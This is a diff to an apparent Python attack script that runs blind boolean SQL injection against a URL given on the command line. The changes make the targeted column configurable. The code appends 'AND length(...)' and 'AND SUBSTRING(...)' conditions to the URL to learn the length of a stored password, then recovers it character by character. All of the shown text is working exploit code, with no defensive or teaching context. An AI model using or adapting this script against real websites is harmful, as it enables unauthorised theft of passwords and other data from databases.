@@ -20,16 +20,16 @@ if len(sys.argv) != 5:
 #param = id
 url = sys.argv[1]
 msg = sys.argv[2]
+champ = "code"
 
 print("[+] URL :", url)
-
 
 password_size = 0
 print("[+] Checking password size...")
 
 for x in range(1,50):
 
-    result = checkURL(url + workingId + " AND length(code) >= " + str(x), msg)
+    result = checkURL(url + " AND length("+ champ +") >= " + str(x), msg)
     time.sleep(0.2)
 
     if result:
@@ -49,7 +49,7 @@ for x in range(1, password_size + 1):
     time.sleep(0.2)
 
     for c in alpha:
-        param = workingId +" AND SUBSTRING(code," + str(x) + ", 1) = '" + c + "'" 
+        param = " AND SUBSTRING("+ champ +"," + str(x) + ", 1) = '" + c + "'" 
         result = checkURL(url + param, msg)
         print("[+] Retrieving password :", password + c, end="\r")
 
